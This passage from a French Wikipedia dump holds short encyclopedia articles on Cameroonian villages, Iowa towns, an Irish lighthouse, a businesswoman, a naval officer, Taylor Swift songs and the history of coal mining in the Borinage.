En 2005, il devient l'un des directeurs sportifs de la nouvelle équipe professionnelle Bretagne-Jean Floc'h.
En parallèle, il mène une vie sociale riche, étant notamment un éducateur très impliqué dans la vie de quartier à Lorient .

</doc>
<doc id="10580024" url="https://fr.wikipedia.org/wiki?curid=10580024" title="Aplington">
Aplington

Aplington est une ville du comté de Butler, en Iowa, aux États-Unis. La ville est incorporée le . Il s'agissait à l'origine de "Fort Aplington", un avant-poste de l' armée américaine jusqu'à ce que le fort brûle en 1885. À ce moment-là une petite ville avait été construite à proximité et, bien qu'une grande partie de l'économie de la ville était basée sur l'activité du fort, celle-ci parvient à survivre. La ville garde le nom de Fort Aplington jusqu'en 1925 puis elle prend le nom actuel.
&lt;mapframe zoom=12 latitude =42.5825 longitude =-92.8825 align=left width=250 height=250 text="Carte interactive d'Aplington."&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q1914574", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10580027" url="https://fr.wikipedia.org/wiki?curid=10580027" title="Roger Trehin">
Roger Trehin



</doc>
<doc id="10580035" url="https://fr.wikipedia.org/wiki?curid=10580035" title="Fatine Layt">
Fatine Layt

Fatine Layt (née à Casablanca le 10 juillet 1967) est une femme d’affaires franco-marocaine. Elle dirige la banque d'affaires LionTree en France.
Formation.
Née à Casablanca, d’une mère française diplômée de linguistique et d’un père marocain diplômé des Ponts et Chaussées, elle passe son bac au lycée Sainte-Marie. Elle dirige plusieurs orchestres et chorales de jeunes, et d’adultes. Violoncelliste, elle décroche en 1982 le premier Prix de musique de chambre du Conservatoire de Paris.
Parallèlement à une classe préparatoire littéraire d’hypokhâgne, elle est diplômée de Sciences Po (Major de sa promotion - section éco-fi, promotion 1988). Elle complète sa formation par le diplôme de Société française des analystes financiers (SFAF) trois ans plus tard. Elle est par ailleurs maître de conférences à Sciences Po entre 1990 et 2001.
Carrière.
Les débuts avec le groupe Euris.
Après quelques mois en tant que trader obligataire à la société boursière Legrand, elle se rapproche de Jean-Charles Naouri, l’ancien directeur de cabinet de Pierre Bérégovoy et réformateur des marchés financiers européens, qui l’engage au sein du fonds d’investissement Euris, qu’il vient de créer avec David de Rothschild, Vincent Bolloré, Marc Ladreit de Lacharrière.
Fatine Layt monte au sein du groupe, pionnier du "private equity" en France. En parallèle de son activité au sein de l'équipe d'investissement, elle est administratrice déléguée d'Editeuris, une holding rassemblant les participations d’Euris dans divers groupes d’édition et de presse, notamment Oros, Actes Sud, Glénat Éditions. Elle devient également directrice générale de la première agence de photographie mondiale Sygma.
Le parcours d’entrepreneur.
En 1999, elle crée sa propre société de conseil en fusions-acquisitions, Intermezzo, l'une des premières « boutiques » en fusions-acquisitions, spécialisée notamment dans les médias. Elle organise la vente de l’hebdomadaire Le Nouvel Économiste, travaille avec Pathé pour recapitaliser Libération, avec 3I, El Mundo, Le Nouvel Observateur.
En 2003, elle s’associe avec Jean-Marie Messier pour créer Messier Partners LLC, une société de conseil dans les fusions-acquisitions basée à New-York et à Paris, dont elle est la Directrice Générale-associée.
En 2007, elle fonde la banque d’affaires Partanea, et sa filiale, Partanea Value précurseur en matière de conseil en gouvernance. Deux ans plus tard, Partanea est rachetée par Oddo &amp; Cie dont elle devient membre du comité exécutif, et présidente et associée-gérante d'Oddo Corporate Finance, la banque d’affaires du groupe, pendant sept ans. Elle est un temps pressentie pour succéder à Rachida Dati au Ministère de la Justice, mais choisit de se concentrer sur ses missions chez Oddo.
En octobre 2015, Fatine Layt quitte Oddo pour relancer une boutique de M&amp;A, , une banque d’affaires spécialisée dans les médias, télécoms et le "food-retail" qui mène par exemple l'opération de rachat de L'Étudiant à Altice Media ou encore la cession de titres de presse du groupe Mondadori.
En janvier 2017, elle lance et prend la direction de LionTree en France, en qualité d’associée gérante, pour développer en France et en Europe cette banque d’affaires américaine fondée par , basée à New-York.
Famille.
Fatine Layt a une fille.
Engagements.
Fatine Layt est la Présidente d'honneur du Cercle des partenaires du théâtre des Bouffes-du-Nord.
Distinctions.
 en 2009.

</doc>
<doc id="10580046" url="https://fr.wikipedia.org/wiki?curid=10580046" title="Plan d'action européen de la défense">
Plan d'action européen de la défense

Le Plan d'action européen de la défense est une communication de la Commission européenne au sujet de la défense adoptée le . Il s'inscrit dans le cadre de la mise en œuvre de la Stratégie globale de l'Union européenne.

</doc>
<doc id="10580047" url="https://fr.wikipedia.org/wiki?curid=10580047" title="Phare de Rathlin O'Birne">
Phare de Rathlin O'Birne

Le phare de Rathlin O'Birne est un phare situé sur l'Île "Rathlin O'Birne" au large de Gleann Cholm Cille dans le comté de Donegal (Irlande). Il est géré par les Commissioners of Irish Lights (CIL).
Histoire.
&lt;mapframe zoom=16 latitude =54.664 longitude =-8.833 align=left width=250 height=250 text="Carte interactive du phare de Rathlin O'Birne"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "marker-color": "#ff8040",
 "marker-size": "medium",
 "marker-symbol": "lighthouse"
 "geometry": {
 "type": "Point",
 "coordinates": [
 -8.833,
 54.664
 ]
}&lt;/mapframe&gt;
En 1841, l'autorité portuaire de Dublin avait demandé la nécessité d'avoir une lumière sur "Rathlin O'Birne". Trinity House accepta le projet, mais celui-ci prit beaucoup de retard à sa réalisa
La station fut mise en service en 1856. C'est une tour ronde en pierre de 20 m de haut, avec lanterne et galerie, peinte en blanc. Juste à côté se trouvent le logement du gardien et des bâtiments annexes. Elle est située sur "Rathlin O'Birne", une petite île située à environ 3 km à l'ouest de "Malin Beg", au sud-ouest du Comté de Donegal.
Il émet, à 35 m au-dessus de la mer, un flash toutes les 15 secondes, un rouge au nord-ouest et un blanc dans les autres directions. Il marque l'entrée nord de la baie de Donegal. La station n'est accessible qu'en bateau et n'est pas visitable.
La station est devenu autonome en 1974 et les gardiens ont été retirés. Il a été le premier grand phare irlandais à être converti à l'énergie solaire en 1994. Plus tôt il avait reçu un générateur nucléaire de 1974 à 1987, remplacé ensuite par un générateur éolien.

</doc>
<doc id="10580049" url="https://fr.wikipedia.org/wiki?curid=10580049" title="Mekomba">
Mekomba

Mekomba est une localité de la région du Centre au Cameroun, localisée dans la commune de Mbandjock et le département de la Haute-Sanaga.
Population.
En 1963, Mekomba III comptait 303 habitants, principalement des Yezoum.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10580050" url="https://fr.wikipedia.org/wiki?curid=10580050" title="Georges Magnane">
Georges Magnane

Georges Magnane, nom de plume de René Catinaud, est un écrivain et traducteur français né le à Neuvic-Entier (Haute-Vienne) et mort le à Neuilly-sur-Seine.
Biographie.
Agrégé d'anglais, enseignant, Georges Magnane était également un athlète pratiquant plusieurs disciplines. Il a publié une quinzaine de romans et traduit divers romanciers anglophones, dont Ernest Hemingway, Philip Roth, Truman Capote et John Updike.
Il a collaboré à "L'Écran français" de 1945 à 1948. 
Parce qu'il est connu en outre comme l'un des pionniers de la sociologie du sport, un colloque international lui a été consacré à Limoges du 4 au .

</doc>
<doc id="10580051" url="https://fr.wikipedia.org/wiki?curid=10580051" title="Équipe cycliste Wetterse Dakwerken-Trawobo-VDM">
Équipe cycliste Wetterse Dakwerken-Trawobo-VDM



</doc>
<doc id="10580060" url="https://fr.wikipedia.org/wiki?curid=10580060" title="Minkouma">
Minkouma

Minkouma est une localité de la région du Centre au Cameroun, localisée dans la commune de Mbandjock et le département de la Haute-Sanaga.
Population.
En 1963, Minkouma comptait 211 habitants, principalement des Mvele.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10580061" url="https://fr.wikipedia.org/wiki?curid=10580061" title="Liste des aéroports desservis par A380">
Liste des aéroports desservis par A380



</doc>
<doc id="10580063" url="https://fr.wikipedia.org/wiki?curid=10580063" title="Rue de la Cité (Troyes)">
Rue de la Cité (Troyes)

La rue de la Cité est une voie historique du centre-ville de Troyes, dans le département de l'Aube.
Situation et accès.
Cette voie qui se trouve dans centre ancien, le "bouchon de Champagne", commence rue Sinart et se termine quai des Comtes-de-Champagne.
Elle est bordée par :

</doc>
<doc id="10580065" url="https://fr.wikipedia.org/wiki?curid=10580065" title="Ndo">
Ndo

Ndo est une localité de la région du Centre au Cameroun, localisée dans la commune de Mbandjock et le département de la Haute-Sanaga.
Population.
En 1963, Ndo IV comptait 365 habitants, principalement des Mvele.
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10580066" url="https://fr.wikipedia.org/wiki?curid=10580066" title="Dvorets Sovetov (métro de Moscou)">
Dvorets Sovetov (métro de Moscou)



</doc>
<doc id="10580071" url="https://fr.wikipedia.org/wiki?curid=10580071" title="Nio-Baboute">
Nio-Baboute

Nio est une localité de la région du Centre au Cameroun, localisée dans la commune de Mbandjock et le département de la Haute-Sanaga.
Population.
En 1963, Nio comptait 35 habitants, principalement des Vute (ou Babouté, d'où son nom).
Lors du recensement de 2005, ce nombre s'élevait à .

</doc>
<doc id="10580072" url="https://fr.wikipedia.org/wiki?curid=10580072" title="Louis Collinet">
Louis Collinet

Louis Edmond Collinet, né à Cherbourg (auj. Cherbourg-en-Cotentin) le et mort à Neuilly-sur-Seine le , est un officier de marine français.
Biographie.
Il entre à l'École navale en et en sort aspirant en avec les félicitations de ses instructeurs. Il sert alors à la division navale d'Extrême-Orient sur le . Enseigne de classe (), il est détaché en 1915 sur le croiseur auxiliaire anglais comme officier de liaison. 
En 1917, second de l'aviso "Algol" à la division des patrouilles de Provence, il commande en 1918 un chalutier armé sur les côtes algériennes. Nommé en août lieutenant de vaisseau, il est adjoint au commandant de l'escadrille de dragage d'Algérie-Tunisie (1919) et s'y fait vivement apprécié de ses supérieurs Guépratte, Darrieus et Gauchet. 
Après avoir suivi les cours de l’École supérieure d'électricité dont il sort ingénieur en 1920, il est nommé en 1921 à la division navale de Syrie puis sert sur le croiseur en Méditerranée (1922). En 1924, il devient chef du service des communications de l'escadre de Méditerranée. 
Collinet fait ensuite l'École de guerre navale et en est breveté en . Il est alors promu capitaine de corvette () et devient aide de camp de l'amiral Dumesnil.
Commandant de l'aviso "Marne" à la division d'Extrême-Orient (1927-1928), officier d'ordonnance du ministre de la Marine (1929), sous-chef du cabinet militaire, il est nommé capitaine de frégate en et sert comme second du croiseur en Méditerranée. 
Commandant du contre-torpilleur (1932) dont il a suivi l'achèvement et les essais, il devient chef d'état-major de la division légère sur le "Foch" et suit la session, en 1935, du Centre des hautes études navales. Professeur de tactique de surface à l’École de guerre navale, il est promu capitaine de vaisseau en . 
Chef du bureau de l’État-major général, il est en 1938 le commandant du croiseur lourd en Méditerranée puis du bâtiment de ligne () avec lequel il est incorporé à la Force de Raid et participe aux opérations dans l'Atlantique de l'hiver 1939-1940. 
Le , pendant l'attaque de Mers el-Kébir, il se fait remarquer pour son sang-froid et pour ses qualités de manœuvrier qui lui permettent de parvenir à sortir de la rade sous les bombardements et de revenir à Toulon en échappant à la poursuite de ses ennemis. 
Contre-amiral (), il commande la marine à Toulon puis la escadre et reçoit en le commandement de la division navale d'Afrique occidentale avec le titre de délégué de l'amirauté française à Dakar. 
Promu vice-amiral en , il n'accepte pas sa nomination de chef d'état-major de la marine qui lui est offerte en 1943 à Alger et revient à Toulon comme commandant interallié de la zone d'Afrique occidentale. 
Commandant de la marine au Maroc avec le titre d'amiral Ouest-Afrique (), il est nommé inspecteur général des réserves de l'armée de mer en février 1948 mais meurt à Neuilly-sur-Seine, d'une maladie foudroyante, le .

</doc>
<doc id="10580073" url="https://fr.wikipedia.org/wiki?curid=10580073" title="Discovery Primea">
Discovery Primea

Le Discovery Primea est un gratte-ciel de 239 mètres construit en 2014 à Makati aux Philippines. 
Lien externe.
CTBUH

</doc>
<doc id="10580077" url="https://fr.wikipedia.org/wiki?curid=10580077" title="Joseph Moerenhout">
Joseph Moerenhout

Joseph Moerenhout, dit Jef Moerenhout, né le à Lede et mort le à Tielt, est un coureur cycliste belge. Professionnel de 1932 à 1946, il a notamment remporté le Tour de Belgique en 1935.

</doc>
<doc id="10580084" url="https://fr.wikipedia.org/wiki?curid=10580084" title="Akomo">
Akomo

Akomo est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Akomo comptait 203 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 298 personnes.

</doc>
<doc id="10580086" url="https://fr.wikipedia.org/wiki?curid=10580086" title="Ambassade de Gambie au Sénégal">
Ambassade de Gambie au Sénégal

L'ambassade de Gambie au Sénégal est la représentation diplomatique de la Gambie auprès de la République du Sénégal. Elle est située à Dakar, la capitale du pays.
Ambassade.
L'ambassade est située à Dakar. 
Histoire.
Le , Adama Barrow est investi président de la Gambie à l'ambassade de Gambie au Sénégal.

</doc>
<doc id="10580089" url="https://fr.wikipedia.org/wiki?curid=10580089" title="Atolo (Lembe-Yezoum)">
Atolo (Lembe-Yezoum)

Atolo est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Atolo comptait 116 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 69 personnes.

</doc>
<doc id="10580091" url="https://fr.wikipedia.org/wiki?curid=10580091" title="Wildest Dreams (chanson de Taylor Swift)">
Wildest Dreams (chanson de Taylor Swift)

 est le cinquième single de l'album de Taylor Swift, "1989".
Clip vidéo.
L'histoire commence dans la savane, dans laquelle un studio de cinéma est installé. Les deux protagonistes sont Taylor, qui est une actrice, et un charmant garçon (Scott Eastwood), qui est un acteur. Au début, Taylor se fait maquiller puis elle va tourner une scène où elle embrasse le jeune homme. Après, ont lieu des scènes d’amour entre eux dans la savane avec les animaux. Taylor porte une longue robe jaune, écho au refrain. On la retrouve dans un lit avec son amant en train de s'embrasser. Par la suite, Taylor tourne une autre scène. Elle prend ensuite l’avion avec le garçon. Le tournage se poursuit. Avant le refrain final, la chanteuse est avec des animaux comme des lions ou des éléphants. Il y a des éclairs dans le ciel.
Ensuite, la chanteuse et l'homme arrive au cinéma lors d’une soirée pluvieuse pour regarder la première du film que les deux personnages ont tourné. Taylor remarque alors que l'homme était déjà fiancé. Le visionnage du film commence, mais avant la fin du film, Taylor quitte en limousine et en larmes le cinéma. Le garçon court pour la rejoindre sans y parvenir.

</doc>
<doc id="10580093" url="https://fr.wikipedia.org/wiki?curid=10580093" title="Bana (Lembe-Yezoum)">
Bana (Lembe-Yezoum)

Bana est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Bana comptait 143 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 617 personnes.

</doc>
<doc id="10580096" url="https://fr.wikipedia.org/wiki?curid=10580096" title="Dumont (Iowa)">
Dumont (Iowa)

Dumont est une ville du comté de Butler, en Iowa, aux États-Unis. La ville est incorporée le .
&lt;mapframe zoom=12 latitude =42.749444 longitude =-92.9722 align=left width=250 height=250 text="Carte interactive de Dumont"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q2247772", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10580097" url="https://fr.wikipedia.org/wiki?curid=10580097" title="Festival du Bois-de-la-Bâtie">
Festival du Bois-de-la-Bâtie



</doc>
<doc id="10580100" url="https://fr.wikipedia.org/wiki?curid=10580100" title="Komlan Agbégniadan">
Komlan Agbégniadan

Komlan Agbégniadan (né le au Togo) est un joueur de football international togolais, qui évolue au poste d'attaquant.
Il évolue avec le Blau-Weiß Mintard.
Biographie.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Togo le , contre le Niger. Ce match perdu 2-0 rentre dans le cadre des éliminatoires du championnat d'Afrique 2016.
Le , lors de sa deuxième sélection, il inscrit un doublé contre Djbouti. Ce match gagné sur le large score de 5-0 rentre dans le cadre des éliminatoires de la Coupe d'Afrique des nations 2017. Par la suite, le , il inscrit un but lors d'un match amical face aux Comores (score : 2-2).
Il participe avec le Togo à la Coupe d'Afrique des nations 2017 organisée au Gabon.

</doc>
<doc id="10580104" url="https://fr.wikipedia.org/wiki?curid=10580104" title="Famille Buquet">
Famille Buquet

 
La famille Buquet est une famille de Lorraine, originaire de Charmes, illustrée au début du par deux généraux barons de l'empire en 1808 et 1811. Elle s'éteignit à la fin du .
Histoire.
Selon une tradition, la famille Buquet viendrait d'Écosse à la suite du mariage en 1538 de Jacques V, roi d'Écosse avec Marie de Lorraine, toutefois sa filiation n’est connue que depuis 1670. Elle résidait au 
dans la petite ville de Charmes en Lorraine.
Léopold Buquet, habitant de Charmes dans les Vosges, marié vers 1765 à Elisabeth-Françoise Perrin, eut quatre fils dont Louis-Léopold et Charles-Joseph qui furent des officiers généraux sous le Premier Empire.
Cette famille s'éteignit en ligne masculine en 1883 avec Henry Alfred Léopold Buquet (1807-1883), député-maire de Nancy.
Armes.
"Tiercé en fasce : au 1 d'hermines; au 2 de sable à l'étoile d'or; au 3 d'azur au cygne d'argent nageant sur une rivière du même; franc quartier des barons de l'armée, brochant au neuvième de l'écu" (Armes de Henri Alfred Léopold Buquet (1800-1800) baron d'Empire en 1800).
"D’agent, à la bande de sable, chargée de trois annelets d’or et accompagnée de deux lions du second, armés et lampassés de gueules ; au franc quartier des barons de l’armée." (Armes de Charles Nicolas Buquet, baron de l'Empire le ).
Alliances.
Perrin (vers 1765), Billecard de Wall (1804), Lambert (1805), Guerrier de Dumast (1836), Fourrier de Bacourt (1836), Pierson de Brabois (1857), Bruneau, Robert etc.

</doc>
<doc id="10580105" url="https://fr.wikipedia.org/wiki?curid=10580105" title="Carmélites du Divin Cœur de Jésus">
Carmélites du Divin Cœur de Jésus

Les carmélites du Divin Cœur de Jésus (en latin : "Carmelitae Divini Cordis Jesu") sont une congrégation religieuse féminine enseignante et hospitalière de droit pontifical.
Histoire.
La congrégation est fondée à Berlin le par Marie-Thérèse de Saint Joseph (1855 - 1938) pour l'assistance aux orphelins. En 1904, ayant ouvert une succursale à Rocca di Papa, les sœurs sont approuvés pour la première fois par le cardinal Francesco Satolli, évêque suburbicaire de Frascati.
L'institut est affilié à l'ordre des Carmes Déchaux le et reçoit le décret de louange le , la congrégation est finalement approuvée par le Saint-Siège le .
Activités et diffusion.
Les Carmélites du Cœur Divin se dédient à l'adoration eucharistique en esprit de réparation, à l'éducation des jeunes et aux soins des personnes âgées.
La maison généralice est à Sittard.
En 2017, l'institut comptait 381 religieuses dans 48 maisons.

</doc>
<doc id="10580107" url="https://fr.wikipedia.org/wiki?curid=10580107" title="Fifteen (chanson)">
Fifteen (chanson)

Fifteen est le quatrième single de l'album de Taylor Swift, "Fearless" (2009).
Inspirées par la première année de lycée de Swift, les paroles racontent comment elle et son amie Abigail Anderson, toutes deux âgées de quinze ans, vivent des chagrins d'amour et réalisent leurs aspirations. Swift a inclus le morceau sur l'album après qu'Anderson ait consenti aux références personnelles. Elle a produit "Fifteen" avec , une chanson country pop à la mélodie pop. Big Machine Records a diffusé "Fifteen" sur les radios country américaines le .
Swift s'est associée au détaillant d'électronique Best Buy pour « @15 », une initiative caritative destinée aux adolescents. "Fifteen" a atteint les charts et a reçu des certifications en Australie, au Canada et aux États-Unis. Les critiques musicaux ont salué l'écriture de Swift pour sa sonorité entraînante et son utilisation de récits aux détails saisissants pour décrire avec sincérité les expériences adolescentes ; beaucoup l'ont choisi comme un album et un moment fort de sa carrière. Le single a remporté un Teen Choice Award dans la catégorie « Choice Country Song ». Certaines autrices féministes ont critiqué les paroles évoquant la déception d'Anderson après qu'elle ait « tout donné à un garçon qui a changé d'avis », les jugeant négatives sur le plan sexuel.
 a réalisé le clip de "Fifteen", sur fond vert, où Swift se remémore des souvenirs de lycée avec Anderson dans un jardin. Il a été nommé aux MTV Video Music Awards 2010 pour le prix du meilleur clip féminin. Swift a interprété "Fifteen" à la cérémonie des Grammy Awards en 2009, aux Country Music Association Awards 2009, lors d'émissions télévisées aux États-Unis et en Angleterre, ainsi que lors des tournées Fearless Tour (2009-2010) et Speak Now World Tour (2011-2012). Après un litige en 2019 concernant la propriété de son catalogue, Swift a sorti une version réenregistrée, Fifteen (Taylor's Version), pour son album réenregistré "Fearless (Taylor's Version)" (2021).

</doc>
<doc id="10580108" url="https://fr.wikipedia.org/wiki?curid=10580108" title="Ekang">
Ekang

 
Ekang est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Ekang comptait 125 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 163 personnes.

</doc>
<doc id="10580110" url="https://fr.wikipedia.org/wiki?curid=10580110" title="Collinet">
Collinet



</doc>
<doc id="10580111" url="https://fr.wikipedia.org/wiki?curid=10580111" title="Endoum (Lembe-Yezoum)">
Endoum (Lembe-Yezoum)

Endoum est un village du Cameroun, situé dans l'arrondissement (commune) de Lembe-Yezoum, le département de la Haute-Sanaga et la région du Centre.
Population.
En 1963, Endoum comptait 365 habitants, principalement des Yezoum. Lors du recensement de 2005, on y a dénombré 579 personnes.

</doc>
<doc id="10580115" url="https://fr.wikipedia.org/wiki?curid=10580115" title="Industrie minière dans le Borinage">
Industrie minière dans le Borinage

Le Borinage est une région belge située en Région wallonne dans la province de Hainaut, à l'ouest et au sud-ouest de la ville de Mons, à l'extrémité ouest du sillon Sambre-et-Meuse. C'est un ancien site minier de grande importance au et au début du . L'exploitation de charbonnages de taille considérable fit du Borinage un des berceaux de la révolution industrielle après l'Angleterre et une des régions les plus prospères d'Europe avant un déclin inéluctable qui amena le chômage et la misère. Aujourd'hui, le Borinage est une région économiquement sinistrée. 
Historique.
L'exploitation des mines dans le Borinage remonte à une époque très ancienne. D'après l'inspecteur des mines C. Payot-Descharmes, autour de Mons, vers l'an mil, il existe de nombreuses mines de charbon. À cette époque, la houille est exploitée par les "fourfeyeux" (fouilleurs). On ne creuse pas de puits car les veines affleurent. Dès que l'exploitation présente des difficultés, on remblaye les excavations et on recommence à un autre endroit.
Au , l'exploitation est déjà très active dans la région, comme le prouve un acte daté du . En vertu de cet acte, le nombre total des puits est limité. On ne peut pas travailler de la Pentecôte à la mi-septembre (fête de la Sainte-Croix), en raison des travaux agricoles.
C'est dans le sud du bassin, à Frameries, Pâturages, Wasmes, Dour et dans le bois de Boussu que les premières exploitations sont signalées, à cause de l'affleurement des veines. La propriété des mines est un privilège de la Haute justice. Le seigneur a le pouvoir, dans son domaine, d'extraire la houille par lui-même ou par convention. 
La houille est portée à dos de mulet depuis les fosses pour être embarquée sur de petits bateaux sur la Haine puis l'Escaut. Parallèlement, des carrières et des fours à chaux sont en exploitation au Bois de Boussu et dans la vallée du Hanneton. Cela est dû à la superposition de couches de calcaire et de grès dévonien avec celles de houille. Cette coexistence des deux industries dure jusqu'au .
En 1619, les archiducs Albert et Isabelle promulguent des chartes fixant la nature du droit de charbonnage, pour le seigneur et les concessionnaires. C'est l'apparition du droit perpétuel et inamovible du concessionnaire, tant qu'il remplit les charges de sa concession.
Au début du , l'industrie houillère prend de plus en plus d'extension, mais seules les têtes de veines sont exploitables. Il n'est pas possible de creuser à cause de l'eau. 
La « machine à feu », invention de Thomas Newcomen, révolutionne l'industrie minière. L'eau qui envahit les puits peut être pompée. On peut extraire le charbon à de plus grandes profondeurs. On connaît notamment la machine du Bois de Boussu, inaugurée en 1747, décrite dans l"'Encyclopédie" de Diderot et d'Alembert.
À partir de ce moment, on ira chercher le charbon à des profondeurs de plus en plus grandes : en 1790, la plus grande profondeur des puits ne dépassait pas ; en 1820 on arrivait à ; en 1838 la moyenne était de , mais certains puits dépassaient ; en 1866 il y avait des fosses ayant plus de de profondeur. À sa fermeture en 1960, le charbonnage du « Rieu du Coeur » à Quaregnon est celui qui enregistre la plus grande profondeur atteinte dans le Borinage avec mètres. 
Les lois abolitives de la féodalité de 1793 et l'occupation française placent les mines boraines sous la loi du , qui fonde le droit minier en France. Les concessionnaires antérieurs à cette loi deviennent propriétaires de leurs concessions sans formalité préalable. Il se constitue alors dans le Borinage une grande quantité de petites concessions, de formes très irrégulières, constituées parfois de groupes de veines superposés qui s'enchevêtrent. 
Entre 1822 et 1829, la production va plus que doubler dans la région, passant de à 1,26 million de tonnes, ce qui représente plus que la production totale de la France et l'Allemagne à l'époque. Le Borinage exportait son charbon principalement en France et en Flandre.
La nécessité de descendre toujours plus bas et le coût grandissant des appareillages d'extraction et de surface amènent, dans la deuxième partie du et au , des fusions de sociétés toujours plus importantes telles que la S.A. des Charbonnages Unis de l'Ouest de Mons, la S.A. des Charbonnages du Levant du Flénu ou la Compagnie des Charbonnages belges.
En 1840, on dénombre 32 charbonnages et 109 puits en activité. Vers 1870, il n'y a plus que 26 charbonnages et 70 puits. À la même époque, l'extraction progresse de tonnes à tonnes. La population des communes ouvrières triple entre 1816 et 1876. La réputation des mines belges s'étend à l'Europe entière en raison de l'excellence de l'outillage et de l'organisation du travail grâce notamment à la division du travail au fond qui se généralise.
En 1920, on compte 17 sociétés exploitantes qui emploient . L'ensemble des concessions couvrent une superficie ha. La production totale est de tonnes .
Après la Seconde Guerre mondiale, commence la construction de l'Europe. La Belgique signe en 1951 le Traité instituant la Communauté européenne du charbon et de l'acier (C.E.C.A.) qui la solidarise avec la République fédérale d'Allemagne, la France, l'Italie, les Pays Bas et le Grand-duché de Luxembourg.
L'ouverture des frontières, en faisant baisser les prix de revient du charbon et le coût élevé de la main-d’œuvre entraînent une diminution sensible des recettes des sociétés charbonnières. Malgré une aide de la Communauté européenne et de l'État belge, ces sociétés doivent se résoudre à diminuer leur production. De nombreux puits sont fermés.
L'insuffisance de rentabilité des veines trop minces et trop accidentées va provoquer la fermeture de toutes les mines boraines et la ruine de toute la région qui fut très longtemps la plus industrialisée du pays. En 1957, sur employées dans le Borinage, travaillaient dans l'industrie du charbon. Seules travaillaient dans les services, alors qu'en Belgique dans son ensemble, 49 % étaient employés dans le secteur tertiaire. 
Des études effectuées en 1959 et 1961 estiment que la majorité des mines doivent fermer. Certaines, qui ont entrepris des travaux de modernisation très coûteux, sont encore rentables et pourraient être conservées (Vedette, Crachet-Picquery, etc.). Ce n'est pas le cas. Le , le Siège des Sartis à Hensies, dernier charbonnage du bassin encore en activité, ferme ses portes.
Deux sites majeurs du patrimoine minier du Borinage sont l'objet d'une reconversion remarquable : le Grand-Hornu, rénové et restauré par un architecte de Hornu, Henri Guchez, accueille le Musée des arts contemporains de la Fédération Wallonie-Bruxelles (MAC's) et, à Frameries, le Crachet-Picquery abrite le Parc d'aventures scientifiques et de société (PASS), sur un projet architectural conçu par Jean Nouvel.
Les principaux sites d'exploitation.
Baudour.
En 1899, la S.A. du Charbonnage de Baudour veut entreprendre l'exploitation du gisement houiller dit du « Comble Nord » en creusant à partir de la surface, non pas verticalement mais bien en plan incliné, deux galeries à grande section dans le bois de Baudour. L'acte d'achat, à la famille de Ligne, des terrains nécessaires aux accès, puits et bâtiments, est signé le et confère à cette société la propriété d'exploitation d'une contenance de . L'idée originale, de creuser des tunnels inclinés à Baudour, provient de la structure géologique profonde : les terrains improductifs à la houille du Tertiaire, du Crétacé et du Wealdien (appelés « morts-terrains » par les mineurs), réputés très aquifères ! , recouvrent les schistes et les grès du houiller renfermant le charbon. Le , un coup d'eau se produit au fond d'un des deux tunnels à de l'entrée soit à la verticale. Cette venue d'eau était en réalité une source d'eau chaude à 51 °C. La Princesse de Ligne fit exploiter cette source qui avait des propriétés thermales particulières. Elle créa au château un centre de thermalisme et d'hydrothérapie qui s'appela « Radio institut ». Il était alimenté par cette source baptisée Source Elisabeth. Le charbonnage est définitivement fermé le .
Bernissart.
Dès 1735, on creuse à Bernissart une quinzaine de fosses pour y extraire du charbon. La concession concernant l'exploitation des gisements situés sous les communes de Blaton, Bernissart, Pommeroeul, Ville-Pommeroeul, Harchies, Grandglise, Stambruges et Péruwelz ( ha) est accordée à la S.A Charbonnages de Bernissart par arrêté royal le . La proximité de voies de communication favorise le développement de cette exploitation : les canaux de Mons à Condé, Pommeroeul à Antoing et de Blaton à Ath, la route de Mons à Tournai, les chemins de fer de Blaton à Ath et Hainaut-Flandres.
On dénombre cinq puits d'extraction :
En 1885, la production totale de charbon est de tonnes. La société occupe employé et ouvriers dont 850 pour le fond, hommes et enfants. On dénombre peu de femmes, travaillant essentiellement à dans une briqueterie annexe. Dix cités ouvrières comportent 104 habitations, accordées gratuitement à certains membres du personnel. Un médecin spécial est attaché à l'établissement et fournit médicaments et soins aux malades et blessés. Il existe une société de musique qui enseigne aux enfants les notions musicales et fournit les instruments.
La société des Charbonnages de Bernissart, peu modernisée et victime de nombreuses inondations sur ses chantiers, ferma ses puits Bernissartois entre 1913 et 1926. Le siège d'Harchies continuera l'exploitation jusqu'en 1964, date de sa fermeture définitive.
Boussu-Bois.
Boussu-Bois fait actuellement partie de la commune de Boussu. Entre le milieu du et 1961 on y exerce une forte exploitation charbonnière. Au début du , la S.A. des Charbonnages Unis de l'Ouest de Mons emploie jusqu'à dont 70 % de mineurs de fond. On extrait quotidiennement tonnes. En 1920, la société emploie . Avec ses ha de concession, c'est la compagnie la plus importante du Borinage.
Cuesmes.
Cuesmes est un des plus anciens villages du Hainaut. Des outils de l'âge de la pierre y ont été découverts. Au Moyen Âge, le village est un ancien alleu du chapitre noble de sainte Waudru. Les chanoinesses ouvrirent entre autres la voie de l'industrialisation en permettant le début de travaux d'exploitations minières dès le début du . Dès la fin du l'industrie minière se développa considérablement et marqua très fort le paysage environnant.
En 1835, la constitution de la S.A. des charbonnages du Levant de Flénu, une des premières entreprises belges cotées à la Bourse de Bruxelles, permet le développement de l'industrie minière à Cuesmes. On compte 5 sièges d'extraction :
Dour.
À Dour plusieurs sociétés se partagent la gestion des différents sites miniers :
